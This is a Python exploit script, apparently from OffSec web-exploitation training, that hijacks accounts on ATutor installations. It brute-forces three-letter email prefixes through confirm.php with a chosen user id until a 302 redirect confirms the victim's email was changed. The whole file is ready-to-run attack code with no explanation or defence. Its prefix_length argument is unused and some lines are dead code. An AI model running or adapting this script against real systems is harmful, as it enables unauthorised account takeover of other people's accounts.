import hashlib, string, itertools, re, sys, requests

def update_email(ip, domain, id, prefix_length):
    count = 0
    
    for word in itertools.product(string.ascii_letters, repeat=3):
        joined = ""
        for char in word:
            joined += char

        email = joined + "@" + domain

        url = ("http://%s/ATutor/confirm.php?e=%s&m=0&id&id=%s" % (ip, email, id))
        print ("[+] Issuing update request to URL: %s" % url)
        r = requests.get(url, allow_redirects=False)
        if (r.status_code == 302): 
            return (True, email, count)
        else:
            count+=1




        email = "%s@%s" % (word, domain)
        url = ("http://%s/ATutor/confirm.php?e=%s&m=0&id&id=%s" % (ip, email, id))




    return (False, '', count)

def main():
    if len(sys.argv) != 5:
        print ("(+) usage: %s <domain_name> <id> <prefix_length> <atutor_ip>" % sys.argv[0])
        print ("(+) eg: %s offsec.local 1 3 192.168.188.103" % sys.argv[0])
        sys.exit(-1)

    domain = sys.argv[1]
    id = sys.argv[2]
    prefix_length = sys.argv[3]
    ip = sys.argv[4]

    result, email, c = update_email(ip, domain, id, prefix_length)
    
    if result:
        print ("[+] it worked! Account hijacked with email %s using %d requests" % (email, c))
    else:
        print ("[+] Failed with %d requests" % (c))

if __name__ == "__main__":
    main()

